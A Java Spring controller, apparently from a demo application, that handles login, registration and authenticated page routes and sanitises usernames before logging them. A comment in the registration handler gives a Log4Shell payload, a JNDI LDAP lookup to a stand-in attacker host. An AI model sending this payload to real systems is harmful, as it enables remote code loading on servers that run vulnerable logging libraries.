package com.contrast.frontgateservice.controller;

import com.contrast.frontgateservice.entity.User;
import com.contrast.frontgateservice.service.UserService;
import com.contrast.frontgateservice.service.WebhookServiceProxy;
import com.contrast.frontgateservice.service.ReportServiceProxy;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.security.core.Authentication;
import org.springframework.security.core.context.SecurityContextHolder;
import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.validation.BindingResult;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.ModelAttribute;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestParam;

import javax.validation.Valid;

/**
 * Web Controller handles all web page routes and user authentication flows.
 * This includes login, registration, and navigation to various application pages.
 */
@Controller
public class WebController {

    private static final Logger logger = LogManager.getLogger(WebController.class);

    @Autowired
    private UserService userService;

    @Autowired
    private WebhookServiceProxy webhookServiceProxy;

    @Autowired
    private ReportServiceProxy reportServiceProxy;

    // ==================== PUBLIC PAGES ====================
    
    @GetMapping("/")
    public String home() {
        logger.info("Serving home page");
        return "index";
    }

    // ==================== AUTHENTICATION PAGES ====================
    
    @GetMapping("/login")
    public String login(@RequestParam(value = "error", required = false) String error,
                       @RequestParam(value = "logout", required = false) String logout,
                       Model model) {
        if (error != null) {
            logger.error("Login error occurred. Authentication failed.");
            model.addAttribute("error", "Invalid username or password!");
        }
        if (logout != null) {
            logger.info("User logout successful");
            logger.debug("Logout parameter: {}", logout.replaceAll("[\\${}]", ""));
            model.addAttribute("message", "You have been logged out successfully.");
        }
        logger.info("Serving login page");
        return "login";
    }

    @GetMapping("/register")
    public String register(Model model) {
        logger.info("Serving registration page");
        model.addAttribute("user", new User());
        return "register";
    }

    @PostMapping("/register")
    public String registerUser(@Valid @ModelAttribute("user") User user, 
                              BindingResult bindingResult, 
                              Model model) {
        if (bindingResult.hasErrors()) {
            logger.info("Registration validation failed");
            logger.debug("Validation errors: {}", bindingResult.getAllErrors());
            return "register";
        }

        try {
            // VULNERABLE: Log4Shell vulnerability - logs user-controlled username
            // An attacker can register with username like: ${jndi:ldap://attacker.com/evil}
            // FIXED: Use sanitized logging to prevent log injection
            String sanitizedUsername = user.getUsername().replaceAll("[\\${}]", "");
            logger.info("Attempting to register new user");
            logger.debug("Registration attempt for username: {}", sanitizedUsername);
            
            // Use UserService to create the user through dataservice
            userService.createUser(user.getUsername(), user.getPassword());
            
            logger.info("Successfully registered new user");
            logger.debug("Registered username: {}", sanitizedUsername);
            model.addAttribute("success", "Registration successful! Please login.");
            return "login";
        } catch (Exception e) {
            // Also vulnerable - logs exception message which might contain user input
            // FIXED: Log exception separately and sanitize username
            String sanitizedUsername = user.getUsername().replaceAll("[\\${}]", "");
            logger.error("Registration failed");
            logger.debug("Registration failed for username: {}", sanitizedUsername);
            logger.debug("Exception: {}", e.getMessage());
            logger.debug("Exception details:", e);
            model.addAttribute("error", "Registration failed: " + e.getMessage());
            return "register";
        }
    }

    // ==================== AUTHENTICATED PAGES ====================
    
    @GetMapping("/dashboard")
    public String dashboard(Model model) {
        Authentication auth = SecurityContextHolder.getContext().getAuthentication();
        String username = auth.getName();
        String sanitizedUsername = username.replaceAll("[\\${}]", "");
        
        logger.info("Serving dashboard page for authenticated user");
        logger.debug("Dashboard access by user: {}", sanitizedUsername);
        
        model.addAttribute("username", username);
        return "dashboard";
    }

    @GetMapping("/cats")
    public String cats(Model model) {
        Authentication auth = SecurityContextHolder.getContext().getAuthentication();
        String username = auth.getName();
        String sanitizedUsername = username.replaceAll("[\\${}]", "");
        
        logger.info("Serving cats page for authenticated user");
        logger.debug("Cats page access by user: {}", sanitizedUsername);
        
        model.addAttribute("username", username);
        return "cats";
    }

    @GetMapping("/shipments")
    public String shipments(Model model) {
        Authentication auth = SecurityContextHolder.getContext().getAuthentication();
        String username = auth.getName();
        String sanitizedUsername = username.replaceAll("[\\${}]", "");
        
        logger.info("Serving shipments page for authenticated user");
        logger.debug("Shipments page access by user: {}", sanitizedUsername);
        
        model.addAttribute("username", username);
        return "shipments";
    }

    @GetMapping("/addresses")
    public String addresses(Model model) {
        Authentication auth = SecurityContextHolder.getContext().getAuthentication();
        String username = auth.getName();
        String sanitizedUsername = username.replaceAll("[\\${}]", "");
        
        logger.info("Serving addresses page for authenticated user");
        logger.debug("Addresses page access by user: {}", sanitizedUsername);
        
        model.addAttribute("username", username);
        return "addresses";
    }

    @GetMapping("/webhooks")
    public String webhooks(Model model) {
        Authentication auth = SecurityContextHolder.getContext().getAuthentication();
        String username = auth.getName();
        String sanitizedUsername = username.replaceAll("[\\${}]", "");
        
        logger.info("Serving webhooks page for authenticated user");
        logger.debug("Webhooks page access by user: {}", sanitizedUsername);
        
        model.addAttribute("username", username);
        
        // Check webhook service health and add status to model
        try {
            logger.debug("Checking webhook service health");
            webhookServiceProxy.healthCheck();
            logger.info("Webhook service is online");
            model.addAttribute("webhookServiceStatus", "Online");
        } catch (Exception e) {
            logger.warn("Webhook service is offline: {}", e.getMessage());
            logger.debug("Webhook service health check error:", e);
            model.addAttribute("webhookServiceStatus", "Offline");
        }
        
        return "webhooks";
    }

    @GetMapping("/reports")
    public String reports(Model model) {
        Authentication auth = SecurityContextHolder.getContext().getAuthentication();
        String username = auth.getName();
        String sanitizedUsername = username.replaceAll("[\\${}]", "");
        
        logger.info("Serving reports page for authenticated user");
        logger.debug("Reports page access by user: {}", sanitizedUsername);
        
        model.addAttribute("username", username);
        
        // Check report service health and add status to model
        try {
            logger.debug("Checking report service health");
            reportServiceProxy.healthCheck();
            logger.info("Report service is online");
            model.addAttribute("reportServiceStatus", "Online");
        } catch (Exception e) {
            logger.warn("Report service is offline: {}", e.getMessage());
            logger.debug("Report service health check error:", e);
            model.addAttribute("reportServiceStatus", "Offline");
        }
        
        return "reports";
    }
}
